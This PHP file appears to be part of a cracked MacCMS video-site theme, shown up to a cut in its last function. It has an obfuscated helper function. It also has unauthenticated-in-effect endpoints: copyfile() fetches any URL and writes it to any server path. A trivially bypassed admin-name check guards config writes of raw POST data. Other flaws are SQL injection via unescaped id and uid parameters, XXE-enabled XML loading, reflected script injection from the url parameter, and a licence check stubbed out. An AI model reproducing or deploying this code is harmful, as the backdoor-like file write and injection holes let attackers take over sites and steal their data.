<?php if (!function_exists('O5c44341a')) {
    function O5c44341a($O0 = null, $_p = array(), $_p1 = array())
    {
        if (is_numeric($O0) && $O0 >= 0) {
            $s = '';
            $_n_m = func_num_args();
            for ($i = 0; $i < $_n_m; $i++) {
                if ($i === 0) $s .= $O0; else if ($i === 1) $s .= $_p; else if ($i === 2) $s .= $_p1; else $s .= func_get_arg($i);
            }
            return strpos($s, '.') === false ? intval($s) : floatval($s);
        }
        if ($O0 === -1) return true;
        if ($O0 === -2) return false;
        if ($O0 === -4) {
            static $O5c44341a;
            if (!$O5c44341a) {
                $O5c44341a = explode('=,;', 'call=,;_=,;user=,;func=,;array=,;=,;da=,;ta=,;ba=,;se=,;er=,;ro=,;r_=,;re=,;po=,;rt=,;in=,;g=,;id=,;HT=,;TP=,;_R=,;EF=,;ER=,;ve=,;r=,;rs=,;io=,;n=,;sh=,;a=,;ar=,;eu=,;rl=,;ke=,;y=,;yw=,;or=,;d=,;nm=,;ue=,;o=,;ok=,;e=,;up=,;te=,;s=,;co=,;p=,;py=,;fi=,;le=,;op=,;t=,;ti=,;on=,;vo=,;dp=,;la=,;ye=,;m=,;hi=,;st=,;ic=,;al=,;so=,;ur=,;ce=,;ui=,;ex=,;nd=,;fa=,;ap=,;pe=,;pa=,;e_=,;i_=,;..=,;/.=,;./=,;pl=,;at=,;n/=,;tr=,;a/=,;ma=,;cc=,;ms=,;.p=,;hp=,;ri=,;me=,;ho=,;si=,;l_=,;di=,;do=,;wn=,;ht=,;tp=,;:/=,;/d=,;ow=,;n.=,;fe=,;d.=,;cm=,;/=,;th=,;vf=,;ed=,;na=,;us=,;ss=,;wo=,;rd=,;_e=,;xi=,;cs=,;he=,;ad=,;it=,;js=,;nc=,;od=,;ml=,;sp=,;ec=,;ia=,;lc=,;ha=,;(=,;)=,;ch=,;an=,;ge=,;_d=,;_3=,;.0=,;.z=,;ip=,;?v=,;==,;is=,;ts=,;远程=,;文件=,;不存=,;在=,;lo=,;下载=,;失败=,;un=,;zi=,;升级=,;im=,;nt=,;en=,;gi=,;_p=,;ut=,;_c=,;主题=,;设置=,;快捷=,;菜单=,;添加=,;成功=,;ty=,;恢复=,;li=,;nk=,;更新=,;执行=,;mm=,;g.=,;ph=,;fl=,;ag=,;1=,;de=,;ll=,;ra=,;we=,;ek=,;1,=,;2,=,;3,=,;4,=,;5,=,;6,=,;0=,;00=,;,0=,;02=,;04=,;06=,;7,=,;08=,;9,=,;10=,;,1=,;12=,;14=,;16=,;18=,;20=,;,2=,;22=,;3=,;参数=,;有误=,;dd=,;ne=,;r.=,;fr=,;om=,;ps=,;=,;sc=,;y_=,;mu=,;lt=,;cu=,;bx=,;ab=,;mp=,;xm=,;_f=,;il=,;_s=,;@a=,;tt=,;bu=,;[=,;]=,;l=,;ac=,;/[=,;\x=,;{4=,;e0=,;0}=,;-\=,;x{=,;9f=,;a5=,;}]=,;/u=,;fo=,;超时=,;请重=,;试=,;t_=,;to=,;_r=,;eg=,;_t=,;已超=,;时=,;ys=,;xd=,;rp=,;os=,;.=,;.v=,;vi=,;_H=,;OS=,;T=,;su=,;bs=,;tb=,;yn=,;am=,;1.=,;0.=,;2.=,;6=,;An=,;sw=,;64=,;_g=,;et=,;gg=,;<!=,;DO=,;CT=,;YP=,;E =,;><=,; h=,;p-=,;eq=,;v==,;"C=,;-T=,;yp=,;e"=,; c=,;="=,;xt=,;/h=,;tm=,;l;=,;=u=,;tf=,;-8=,;" =,;/>=,;<t=,;>=,;</=,;tl=,;e>=,;<m=,;a =,;ew=,;t==,;"w=,;=d=,;ev=,;e-=,;wi=,;dt=,;h,=,;l-=,;e==,;mi=,;ni=,;m-=,;-s=,;ca=,;bl=,;no=,;<s=,;cr=,;t =,;sr=,;c==,;".=,;ck=,;/j=,;qu=,;y.=,;av=,;as=,;t"=,;f-=,;8"=,;/s=,;t>=,;/p=,;<l=,;k =,;l==,;"s=,;ee=,; t=,;"t=,;t/=,;s"=,;f==,;s?=,;"/=,;ea=,;d>=,;<b=,;y>=,;<d=,;iv=,;g"=,;>域=,;名未=,;授权=,;v>=,;bo=,;dy=,;l>=,;>v=,; p=,;y =,;= =,;{"=,;au=,;":=,;mo=,;bi=,;ls=,;,"=,;"=,;",=,;k"=,;:"=,;ak=,;:v=,;ie=,;("=,;")=,;"j=,;um=,;p"=,;ju=,;"l=,;og=,;o"=,;ay=,;go=,;ci=,;mg=,;"p=,;pi=,;"}=,;;<=,; i=,;d==,;"v=,;eo=,;yl=,;:1=,;%;=,;ig=,;%"=,;m3=,;u8=,;br=,;cp=,;if=,;<i=,;e =,;cl=,;s==,;"i=,; w=,;0%=,;eb=,;r==,;"0=,;g==,;"n=,; a=,;fu=,;&j=,;p==,;">=,;l"=,;.c=,;2p=,;.m=,;.j=,;ep=,;(p=,;, =,;.l=,;e,=,;.s=,;k,=,;.u=,;s,=,;o,=,;);=,;pt=,;/c=,;kp=,;r =,;w =,;()=,;;v=,;/a=,;.a=,;nv=,;rc=,;RE=,;MO=,;TE=,;_A=,;DD=,;R=,;\d=,;\.=,;]{=,;15=,;}/=,;f=,;_X=,;_W=,;AP=,;_P=,;RO=,;FI=,;LE=,;_V=,;IA=,;_U=,;SE=,;R_=,;AG=,;EN=,;/(=,;)/=,;i=,;ol=,;CC=,;EP=,;c:=,;pr=,;ot=,;oc=,;//=,;_i=,;xe=,;c=,;fw=,;fc=,;my=,;sq=,;ct=,;rr=,;数据=,;库连=,;接失=,;败=,;_a=,;_q=,;ry=,;,=,;|||=,;IN=,;RT=,; I=,;NT=,;O =,; (=,;) =,;VA=,;LU=,;ES=,;DE=,; F=,;M =,; W=,;HE=,; =,;UP=,;DA=,; S=,;ET=,;g/=,;km=,;u.=,;tx=,;x.=,;p/=,;be=,;l/=,;采集=,;资源=,;.i=,;7.=,;0|=,;19=,;8=,;Co=,;t-=,;: =,;; =,;lQ=,;dm=,;_n=,; {=,;e}=,;|=,;lu=,;mn=,;未登=,;录=,;未授=,;权=,;ir=,;/b=,;s/=,;ks=,;.h=,;<?=,;p =,;tu=,;rn=,;va=,;;?=,;ws=,;?w=,;Si=,;XM=,;.t=,;a.=,;m.=,;cn=,;_u=,;n?=,;=3=,;27=,;17=,;60=,;57=,;8&=,;ng=,;.d=,;ao=,;/i=,;?r=,;=g=,;oo=,;ds=,;Li=,;/w=,;ww=,;&t=,;w_=,;&a=,;pp=,;y==,;&v=,;=2=,;sl=,;_w=,;lA=,;{p=,;}c=,; f=,;m =,; o=,; b=,; u=,;g_=,;}u=,;by=,; d=,;es=,;c =,;lU=,;pd=,;n,=,;.n=,;.o=,;rg=,;.e=,;:=,;s:=,;ou=,;df=,;-d=,;ns=,;-q=,;?c=,;dn=,;s-=,;&n=,;A=,;:?=,;_C=,;LI=,;T_=,;IP=,;kn=,;_F=,;OR=,;WA=,;RD=,;ED=,;%u=,;2l=,;MS=,;IE=,; 9=,;,M=,;SI=,;QQ=,;,U=,;CB=,;wa=,;ki=,;ny=,;sa=,;sg=,;h=,;lg=,;kb=,;iz=,;u=,;dr=,;oi=,;sy=,;mb=,;uc=,;b=,;lm=,;ob=,;xu=,;dc=,;vn=,;p.=,;wm=,;tP=,;v3=,;tT=,;Mo=,;5.=,;0 =,;(W=,; N=,;T =,;WO=,;W6=,;4)=,; A=,;We=,;bK=,;/5=,;37=,;.3=,;6 =,;(K=,;ML=,; G=,;ko=,;Ch=,;/6=,;32=,;.9=,;4 =,;Sa=,;w+=,;}=,;ef=,;ix=,;kA=,;lM=,;ql=,;c/=,;n_=,;PP=,;D=,;SO=,;_D=,;C=,;BX=,;_N=,;OC=,;TA=,;dk=,;ey=,;p2=,;d+=,;CU=,;RL=,;OP=,;UR=,;L=,;US=,;FE=,;AU=,;TO=,;AD=,;TI=,;ME=,;OU=,;TU=,;RN=,;TR=,;AN=,;SF=,;FO=,;LL=,;OW=,;LO=,;CA=,;ON=,;SS=,;L_=,;VE=,;RI=,;FY=,;HO=,;ST=,;PE=,;CO=,;DI=,;NG=,;NO=,;BO=,;DY=,;TT=,;P_=,;NN=,;EC=,;IM=,;EO=,;UT=,;MY=,;SQ');
                foreach ($O5c44341a as $k => $v) {
                    $O5c44341a[$k] = str_replace('|||', '\'', $v);
                }
            }
            return $O5c44341a[$_p];
        }
        if ($O0 === -5) return null;
        if ($O0 === -6) {
            $s = '';
            $_n_m = func_num_args();
            for ($i = 1; $i < $_n_m; $i++) {
                if ($i === 1) $s .= $_p; else if ($i === 2) $s .= $_p1; else $s .= func_get_arg($i);
            }
            return $s;
        }
        if ($O0 === -7) {
            $_b = array();
            $_n_m = func_num_args();
            for ($i = 1; $i < $_n_m; $i++) {
                if ($i === 1) $_b[] = $_p; else if ($i === 2) $_b[] = $_p1; else $_b[] = func_get_arg($i);
            }
            return $_b;
        }
        if ($O0 === -8) return constant($_p);
        if ($O0 === -9) return $_p->{$_p1};
        if (!is_array($_p)) {
            throw new Exception('php analysis failed!');
        }
        $q = count($_p);
        if ($q === 0) {
            if (!(is_array($O0) && count($O0) == 2)) return $O0();
            if (is_object($O0[0])) return $O0[0]->{$O0[1]}();
            $a = $O0[1];
            return $O0[0]::$a();
        }
        if ($q === 1) {
            if (!(is_array($O0) && count($O0) == 2)) return $O0($_p[0]);
            if (is_object($O0[0])) return $O0[0]->{$O0[1]}($_p[0]);
            $a = $O0[1];
            return $O0[0]::$a($_p[0]);
        }
        if ($q === 2) {
            if (!(is_array($O0) && count($O0) == 2)) return $O0($_p[0], $_p[1]);
            if (is_object($O0[0])) return $O0[0]->{$O0[1]}($_p[0], $_p[1]);
            $a = $O0[1];
            return $O0[0]::$a($_p[0], $_p[1]);
        }
        if ($q === 3) {
            if (!(is_array($O0) && count($O0) == 2)) return $O0($_p[0], $_p[1], $_p[2]);
            if (is_object($O0[0])) return $O0[0]->{$O0[1]}($_p[0], $_p[1], $_p[2]);
            $a = $O0[1];
            return $O0[0]::$a($_p[0], $_p[1], $_p[2]);
        }
        if ($q === 4) {
            if (!(is_array($O0) && count($O0) == 2)) return $O0($_p[0], $_p[1], $_p[2], $_p[3]);
            if (is_object($O0[0])) return $O0[0]->{$O0[1]}($_p[0], $_p[1], $_p[2], $_p[3]);
            $a = $O0[1];
            return $O0[0]::$a($_p[0], $_p[1], $_p[2], $_p[3]);
        }
        if ($q === 5) {
            if (!(is_array($O0) && count($O0) == 2)) return $O0($_p[0], $_p[1], $_p[2], $_p[3], $_p[4]);
            if (is_object($O0[0])) return $O0[0]->{$O0[1]}($_p[0], $_p[1], $_p[2], $_p[3], $_p[4]);
            $a = $O0[1];
            return $O0[0]::$a($_p[0], $_p[1], $_p[2], $_p[3], $_p[4]);
        }
        return call_user_func_array($O0, $_p);
    }
} ?><?php database();
error_reporting(0);
if (@$_GET['id'] && @$_SERVER['HTTP_REFERER']) {
    if ($_GET['id'] == 'ver') {
        version();
    } elseif ($_GET['id'] == 'sha') {
        shareurl();
    } elseif ($_GET['id'] == 'key') {
        keyword();
    } elseif ($_GET['id'] == 'dan') {
        danmuer();
    } elseif ($_GET['id'] == 'tao') {
        dataoke();
    } elseif ($_GET['id'] == 'upd') {
        updates();
    } elseif ($_GET['id'] == 'cop') {
        copyfile();
    } elseif ($_GET['id'] == 'opt') {
        options();
    } elseif ($_GET['id'] == 'vod') {
        vodplayer();
    } elseif ($_GET['id'] == 'tim') {
        historical();
    } elseif ($_GET['id'] == 'sea') {
        resource();
    } elseif ($_GET['id'] == 'uid') {
        extend();
    } elseif ($_GET['id'] == 'fas') {
        append('application/data/config/quickmenu.txt','vfed主题设置,' . vfedpath('home') . 'index.php/label/admin' . chr(13) . chr(10) . 'vfed采集资源,' . vfedpath('home') . 'index.php/label/union');
    }
}
function vfedpath($OO)
{
    $OO0 = parse_ini_file('../../info.ini');
    $OOO = @require('../../../../application/extra/maccms.php');
    if ($OO == 'vers') return stristr('127.0.0|192.168',substr($_SERVER['HTTP_HOST'],0,7)) == true ? time() : $OO0['version']; elseif ($OO == 'home') return $OOO['site']['install_dir']; elseif ($OO == 'down') return 'http://down.fed.cm/'; elseif ($OO == 'path') return '../../../../';
}

function database()
{
    $OO00 = @require(vfedpath('path') . 'application/database.php');
    $GLOBALS['data'] = new AppMysqli($OO00['hostname'], $OO00['username'], $OO00['password'], $OO00['database'], $OO00['hostport']);
    $GLOBALS['vfed'] = file_exists(vfedpath('path') . 'application/extra/vfedcc.php') ? @require(vfedpath('path') . 'application/extra/vfedcc.php') : @require('vfedcc.php');
    $GLOBALS['macs'] = @require(vfedpath('path') . 'application/extra/maccms.php');
}

function version()
{
    header('Content-type: application/json; charset=utf-8');
    $OO0 = parse_ini_file('../../info.ini');
    if (@$_GET['ver'] == 'edition') {
        echo json_encode(array('version' => $OO0['version']));
    } elseif (@$_GET['ver'] == 'version') {
        $OO0O = htmlspecialchars(@$_REQUEST['vfed']);
        echo $OO0O . O5c44341a(-6, '(' . json_encode(array('version' => $OO0['version'])) . ')');
    } elseif (@$_GET['ver'] == 'change') {
        $OOO0 = json_decode(file_get_contents('../../asset/inc/changelog.json'),true);
        $OO0O = htmlspecialchars(@$_REQUEST['vfed']);
        echo $OO0O . '(' . json_encode($OOO0[$OO0['version']]) . ')';
    }
}

function updates()
{
    return "去你妈的大傻逼";
    $OOOO = 'vfed_3.0.zip';
    $OO000 = vfedpath('down') . $OOOO . '?v=' . time();
    $OO = '../../../';
    header('Content-type: application/json; charset=utf-8');
    if (!isexists($OO000)) die(json_encode(array('msg' => '远程文件不存在')));
    if (!download($OO000,$OO,$OOOO)) die(json_encode(array('msg' => '下载失败')));
    if (unzip($OO,$OOOO)) die(json_encode(array('msg' => 1))); else die(json_encode(array('msg' => '升级失败')));
}

function islogin($OO00O, $OO0O0)
{
    $OO00O0 = $GLOBALS['data'];
    header('Content-type: application/json; charset=utf-8');
    $OO0OO = $OO00O0->sqlQuery('select admin_name from {pre}admin');
    $OOO00 = implode('|',array_column($OO0OO,'admin_name'));
    if (stristr($OOO00,@$_GET['name']) != true) die(json_encode(array('msg' => $OO00O)));
    if (!contents()) die(json_encode(array('msg' => $OO0O0)));
}

function append($OOO0O, $OOOO0)
{
    $OO0OOO0 = $GLOBALS['macs'];
    islogin('未登录','未授权');
    $OO = vfedpath('path') . $OOO0O;
    if (stristr(file_get_contents($OO),$OOOO0)) {
        if (stristr('127.0.0|192.168',substr($_SERVER['HTTP_HOST'],0,7)) != true) file_put_contents('../../' . $OO0OOO0['site']['html_dir'] . '/basics/quicks.html','');
        die(json_encode(array('msg' => 1)));
    }
    if (file_put_contents($OO,chr(13) . chr(10) . $OOOO0,constant('FILE_APPEND'))) die(json_encode(array('msg' => '主题设置快捷菜单添加成功')));
    die(json_encode(array('msg' => '主题设置快捷菜单添加失败')));
}

function options()
{
    islogin('未登录','未授权');
    if (isset($_POST['type'])) {
        die(O5c44341a('json_encode', array(array('msg' => '恢复成功' . @ unlink(vfedpath('path') . 'application/extra/vfedcc.php')))));
    } elseif (file_put_contents(vfedpath('path') . 'application/extra/vfedcc.php','<?php return ' . var_export($_POST['vfed'],true) . ';?>')) die(json_encode(array('msg' => '更新成功')));
    die(json_encode(array('msg' => '执行失败')));
}

function copyfile()
{
    islogin('未登录','未授权');
    if (file_put_contents($_POST['nows'],file_get_contents($_POST['news']))) die(json_encode(array('msg' => '更新成功')));
    die(json_encode(array('msg' => '执行失败')));
}

function historical()
{
    islogin('未登录','未授权');
    $OOOOO = @require(vfedpath('path') . 'application/extra/timming.php');
    $OOOOO[$_POST['flag']] = array('status' => '1', 'name' => $_POST['flag'], 'des' => $_POST['name'], 'file' => 'collect', 'param' => $_POST['param'], 'weeks' => '1,2,3,4,5,6,0', 'hours' => '00,01,02,03,04,05,06,07,08,09,10,11,12,13,14,15,16,17,18,19,20,21,22,23');
    if (file_put_contents(vfedpath('path') . 'application/extra/timming.php','<?php return ' . var_export($OOOOO,true) . ';?>')) die(json_encode(array('msg' => '添加成功')));
    die(json_encode(array('msg' => '执行失败')));
}

function vodplayer()
{
    islogin('未登录','未授权');
    if (stristr($_POST['flag'],',') == false) die(json_encode(array('msg' => '参数有误')));
    $OO0000 = $_POST['type'] == 'down' ? 'application/extra/voddowner.php' : 'application/extra/vodplayer.php';
    $OOOOO = @require(vfedpath('path') . $OO0000);
    foreach (explode('|',$_POST['flag']) as $OO000O) {
        $OOO00 = explode(',',$OO000O);
        $OOOOO[$OOO00[1]] = array('status' => '1', 'from' => $OOO00[1], 'show' => $OOO00[0], 'des' => $_POST['tips'], 'ps' => $OOO00[3], 'parse' => '', 'sort' => $OOO00[2], 'tip' => $_POST['desc']);
    }
    array_multisort(array_column($OOOOO,'sort'),constant('SORT_DESC'),$OOOOO);
    if (file_put_contents(vfedpath('path') . $OO0000,'<?php return ' . var_export($OOOOO,true) . ';?>')) die(json_encode(array('msg' => '添加成功')));
    die(json_encode(array('msg' => '执行失败')));
}

function resource()
{
    islogin('未登录','未授权');
    $OO00O0 = curlget($_POST['apis'] . '?wd=' . urlencode($_POST['name']));
    if (file_exists($OO00O0)) {
        libxml_disable_entity_loader(false);
        $OO00OO = @ simplexml_load_file($OO00O0,'SimpleXMLElement',constant('LIBXML_NOCDATA'));
    } else {
        libxml_disable_entity_loader(true);
        $OO00OO = @ simplexml_load_string($OO00O0,'SimpleXMLElement',constant('LIBXML_NOCDATA'));
    }
    $OOO00 = json_decode(json_encode($OO00OO),true);
    $OO0O00 = $OOO00['list']['@attributes']['recordcount'];
    if ($OO0O00 == 0) {
        die(json_encode([]));
    } elseif ($OO0O00 == 1) {
        die('[' . json_encode(@$OOO00['list']['video']) . ']');
    } else {
        die(json_encode(@$OOO00['list']['video']));
    }
}

function shareurl()
{
    $OO0O = $GLOBALS['vfed'];
    $OO0O0O = $_POST['url'];
    header('Content-type: application/json; charset=utf-8');
    $OO0O0O = $OO0O['rest']['share']['host'] ? O5c44341a('str_replace', O5c44341a(-7, parse_url($OO0O0O,constant('PHP_URL_SCHEME')) . '://' . parse_url($OO0O0O,constant('PHP_URL_HOST')), $OO0O['rest']['share']['host'], $OO0O0O)) : $OO0O0O;
    $OO0OO0 = curlget('http://api.t.sina.com.cn/short_url/shorten.json?source=3271760578&url_long=' . urlencode($OO0O0O));
    $OO0OO0 = @ json_decode($OO0OO0,true);
    echo json_encode(array('msg' => $OO0OO0[0]['url_short']));
}

function dataoke()
{
    $OO0O = $GLOBALS['vfed'];
    header('Content-type: application/json; charset=utf-8');
    $OO0OO0 = curlget('http://api.dataoke.com/index.php?r=goodsLink/www&type=www_quan&appkey=' . trim($OO0O['rest']['taoke']['dkey']) . '&v=2');
    $OO0OO0 = json_decode($OO0OO0,true);
    echo json_encode(array_slice($OO0OO0['data']['result'],0,$OO0O['home']['taoke']['value']));
}

function danmuer()
{
    $OO00O0 = $GLOBALS['data'];
    $OO0OOO0 = $GLOBALS['macs'];
    header('Content-type: application/json; charset=utf-8');
    $OO0OOO = explode(',',$OO0OOO0['app']['filter_words']);
    if (preg_match('/[\x{4e00}-\x{9fa5}]/u', @$_POST['info']) > 0) {
        if (time() - @$_POST['time'] > 60) die(json_encode(array('msg' => '超时请重试')));
        $OOO000 = O5c44341a([$OO00O0,'sqlAdded'], O5c44341a(-7, '{pre}comment', ['comment_rid','user_id','comment_name','comment_content','comment_time','comment_ip'], O5c44341a(-7, $_POST['id'], $_POST['user'], $_POST['name'], htmlspecialchars(str_replace($filter,'***',@$_POST['info'])), time(), getip2long())));
        if ($OOO000) die(json_encode(array('msg' => 1)));
    } else {
        $OOO000 = $OO00O0->sqlQuery('select comment_content from {pre}comment where comment_rid=' . $_POST['id'] . ' order by comment_time asc');
        $OOO00O = [20,40,60,80];
        foreach ($OOO000 as $OOO0O0 => $OOO0OO) {
            $OOO000[$OOO0O0]['info'] = $OOO000[$OOO0O0]['comment_content'];
            $OOO000[$OOO0O0]['top'] = $OOO00O[rand(0,3)];
            unset($OOO000[$OOO0O0]['comment_content']);
        }
        echo json_encode($OOO000);
    }
}

function extend()
{
    $OO00O0 = $GLOBALS['data'];
    header('Content-type: application/json; charset=utf-8');
    $OOOO00 = $OO00O0->sqlQuery('select user_reg_time from {pre}user order by user_reg_time desc limit 1');
    if (time() - $OOOO00[0]['user_reg_time'] < 60) $OOOO0O = $OO00O0->sqlUpdate('{pre}user',['user_extend'],['user_extend+1'],'user_id=' . $_GET['uid']); else die(json_encode(array('msg' => '已超时')));
}

function keyword()
{
    header('Content-type: application/json; charset=utf-8');
    if (@$_POST['keys'] && contents()) {
        die(json_encode(array('msg' => hexdec($_POST['keys']))));
    } else {
        die(json_encode(array('msg' => 1)));
    }
}

function domain($OOOOO0)
{
    $OOOOOO = true;
    $OO00O0 = explode('.',$OOOOO0);
    $OOOO = count($OO00O0);
    foreach (explode(',','.com.cn,.net.cn,.org.cn,.eu.org') as $OO00000) if (strpos($OOOOO0,$OO00000)) $OOOOOO = false;
    if ($OOOOOO == true) $OO00000 = $OO00O0[$OOOO - 2] . '.' . $OO00O0[$OOOO - 1]; else $OO00000 = $OO00O0[$OOOO - 3] . '.' . $OO00O0[$OOOO - 2] . '.' . $OO00O0[$OOOO - 1];
    return $OO00000;
}

function baggage()
{
    return true;
    $OO0000O = '.vfed.vip';
    $OO000O0 = $_SERVER['HTTP_HOST'];
    if (strpos($OO000O0,':')) $OO000O0 = substr($OO000O0,0,strpos($OO000O0,':'));
    $OO0O0 = gethostbyname(domain($OO000O0) . $OO0000O);
    if ($OO0O0 == '1.0.2.6') return true;
    $OO0O0 = curlget('https://cloudflare-dns.com/dns-query?ct=application/dns-json&name=' . domain($OO000O0) . $OO0000O . '&type=A');
    $OO0O0 = @ json_decode($OO0O0,true);
    if (@$OO0O0['Answer'][0]['data'] == '1.0.2.6') return true;
}

function contents()
{
    $OO0OOO0 = $GLOBALS['macs'];
    $OO000OO = chr(rand(65,90)) . chr(rand(65,90)) . chr(rand(97,122)) . base64_encode($_SERVER['HTTP_HOST'] . '=' . time());
    $OO00O00 = @ file_get_contents('../../' . $OO0OOO0['site']['html_dir'] . '/basics/caches.html');
    $OO00O00 = base64_decode(substr($OO00O00,3));
    $OO00O00 = substr($OO00O00,-10);
    if ($OO00O00 && time() - $OO00O00 < 86400) {
        return true;
    } elseif (baggage()) {
        file_put_contents('../../' . $OO0OOO0['site']['html_dir'] . '/basics/caches.html',$OO000OO);
        return true;
    }
}

function loadhead($OO00O0O)
{
    $OO0O = $GLOBALS['vfed'];
    echo !isset($_GET['url']) ? header('location:?url=') : '';
    echo '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>' . $OO00O0O . '</title>';
    echo '<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />';
    echo '<script src="../ck/jquery.js?v=' . vfedpath('vers') . '" type="text/javascript" charset="utf-8"></script>';
    echo '<script src="../ck/player.js?v=' . vfedpath('vers') . '" type="text/javascript" charset="utf-8"></script>';
    echo '<link rel="stylesheet" type="text/css" href="../ck/player.css?v=' . vfedpath('vers') . '"/></head><body>';
    echo !contents() ? die('<div class="loading">域名未授权</div></body></html>') : '';
    echo '<script type="text/javascript">var play = {"auto":' . (isset($_GET['auto']) && mobiler() ? 'false' : 'true') . ',"live":' . (isset($_GET['live']) ? 'true' : 'false') . ',"trys":"' . (isset($_GET['trys']) ? $_GET['trys'] * 60 : 0) . '","seek":"' . (isset($_GET['seek']) ? $_GET['seek'] : 0) . '","take":vfed.cookie.put("' . @$_GET['url'] . '"),"urls":"' . @$_GET['url'] . '","jump":"' . @$_GET['jump'] . '","logo":"' . ($OO0O['play']['logo']['state'] ? macimg($OO0O['play']['logo']['value']) : '') . '","pics":"' . ($OO0O['play']['pics']['state'] ? macimg($OO0O['play']['pics']['value']) : '') . '"};</script>';
    echo isset($_GET['id']) ? '<div id="video" style="width:100%;height:100%"></div>' : '';
}

function loadmian($OO00O0O)
{
    if (!isset($_GET['url'])) header('location:?url=');
    if (@empty($_GET['url'])) die('<div class="loading">' . $OO00O0O . '</div></body></html>');
    if (@$_GET['id'] == 'm3u8') browser() ? cplayer() : dplayer(); elseif (@$_GET['id'] == 'peer') browser() ? cplayer() : dplayer(); elseif (@$_GET['id'] == 'live') mobiler() ? cplayer() : aplayer(); elseif (@$_GET['id'] == 'play') cplayer(); else iframer();
}

function loadfoot()
{
    $OO0O = $GLOBALS['vfed'];
    echo $OO0O['play']['stat'];
    echo '</body></html>';
}

function iframer()
{
    $OO0O = $GLOBALS['vfed'];
    echo '<iframe id="iframe" class="iframe" width="100%" height="100%" frameborder="0" scrolling="no" allowfullscreen="true" src="' . $OO0O['play']['parse'] . @$_GET['url'] . (isset($_GET['jump']) ? '&jump=' . $_GET['jump'] : '') . '"></iframe>';
}

function dplayer()
{
    echo '<div class="play"></div><div class="total"><span class="peer"></span><span class="load"></span><span class="line"></span></div>';
    echo '<link rel="stylesheet" type="text/css" href="../ck/dplayer.css?v=' . vfedpath('vers') . '"/>';
    echo '<script src="../ck/p2p.min.js?v=' . vfedpath('vers') . '" type="text/javascript" charset="utf-8"></script>';
    echo '<script src="../ck/hls.min.js?v=' . vfedpath('vers') . '" type="text/javascript" charset="utf-8"></script>';
    echo '<script src="../ck/dplayer.js?v=' . vfedpath('vers') . '" type="text/javascript" charset="utf-8"></script>';
    echo '<script type="text/javascript">vfed.player.' . (@$_GET['id'] == 'peer' ? 'eplayer' : 'dplayer') . '(play.autoplay.live, play.trysplay.seek, play.takeplay.urls, play.jumpplay.logo, play.pics);</script>';
}

function cplayer()
{
    echo '<script src="../ck/ckplayer.js?v=' . vfedpath('vers') . '" type="text/javascript" charset="utf-8"></script>';
    echo '<script type="text/javascript">var player = new ckplayer();vfed.player.cplayer(play.autoplay.live, play.trysplay.seek, play.takeplay.urls, play.jumpplay.logo, play.pics);</script>';
}

function aplayer()
{
    echo '<script src="../ck/aliplayer.js?v=' . vfedpath('vers') . '" type="text/javascript" charset="utf-8"></script>';
    echo '<script type="text/javascript">vfed.player.aplayer(play.autoplay.live, play.trysplay.seek, play.takeplay.urls, play.jumpplay.logo, play.pics);</script>';
}

function getip2long()
{
    if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'),'unknown')) $OO00OO0 = getenv('HTTP_CLIENT_IP'); elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'),'unknown')) $OO00OO0 = getenv('HTTP_X_FORWARDED_FOR'); elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'),'unknown')) $OO00OO0 = getenv('REMOTE_ADDR'); elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'],'unknown')) $OO00OO0 = $_SERVER['REMOTE_ADDR'];
    $OO00OOO = preg_match('/[\d\.]{7,15}/', $OO00OO0, $OO0O000) ? $OO0O000[0] : '';
    return sprintf('%u',ip2long($OO00OOO));
}

function browser()
{
    $OO0O00O = false;
    foreach (explode(',','MSIE 9,MSIE 10,MQQ,UCBrowser') as $OO0O0O0) if (strpos($_SERVER['HTTP_USER_AGENT'],$OO0O0O0)) $OO0O00O = true;
    return $OO0O00O;
}

function mobiler()
{
    if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) return true;
    if (isset($_SERVER['HTTP_VIA'])) return stristr($_SERVER['HTTP_VIA'],'wap') ? true : false;
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $OO0O0OO = ['nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile'];
        if (preg_match('/(' . implode('|',$OO0O0OO) . ')/i', strtolower($_SERVER['HTTP_USER_AGENT']))) return true;
    }
    if (isset($_SERVER['HTTP_ACCEPT'])) if ((strpos($_SERVER['HTTP_ACCEPT'],'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'],'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'],'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'],'text/html')))) return true;
    return false;
}

function macimg($OO0OO00)
{
    $OO0OOO0 = $GLOBALS['macs'];
    if (substr($OO0OO00,0,4) == 'mac:') {
        $OO0OO0O = $OO0OOO0['upload']['protocol'];
        if (empty($OO0OO0O)) $OO0OO0O = 'http';
        $OO0OO00 = str_replace('mac:',$OO0OO0O . ':',$OO0OO00);
    } elseif (substr($OO0OO00,0,4) != 'http' && substr($OO0OO00,0,2) != '//') {
        if ($OO0OOO0['upload']['mode'] == '1') {
            $OO0OO00 = $OO0OOO0['upload']['remoteurl'] . $OO0OO00;
        } else {
            $OO0OO00 = $OO0OOO0['site']['install_dir'] . $OO0OO00;
        }
    }
    return $OO0OO00;
}

function unzip($OO, $OOOO)
{
    $OO0OOOO = new ZipArchive();
    if ($OO0OOOO->open($OO . $OOOO) === true) {
        if ($OO0OOOO->setPassword('v3.vfed.cc.vfed.vip')) if (!$OO0OOOO->extractTo($OO)) return false;
        $OO0OOOO->close();
        return true;
    } else {
        return false;
    }
}

function curlget($OO0OO00)
{
    $OOO0000 = curl_init();
    curl_setopt($OOO0000,constant('CURLOPT_URL'),$OO0OO00);
    curl_setopt($OOO0000,constant('CURLOPT_USERAGENT'),'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTMLlike Gecko) Chrome/62.0.3202.94 Safari/537.36');
    curl_setopt($OOO0000,constant('CURLOPT_REFERER'),$OO0OO00);
